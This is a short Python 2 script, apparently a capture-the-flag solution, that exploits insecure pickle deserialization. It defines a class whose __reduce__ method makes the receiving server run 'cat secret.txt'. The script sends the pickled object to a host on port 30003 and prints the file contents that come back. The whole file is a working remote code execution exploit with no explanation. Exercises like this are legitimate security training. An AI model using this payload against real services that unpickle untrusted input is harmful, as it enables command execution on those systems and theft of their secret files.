import socket
import sys
import pickle
import subprocess

HOST, PORT = sys.argv[1], 30003

class solution(object):
    
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "secret.txt"], ))

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to server and send data
    sock.connect((HOST, PORT))
    
    s = solution()
    obj = pickle.dumps(s)
    sock.send(obj)
    
    received = sock.recv(1024)
    print received
    
finally:
    sock.close()
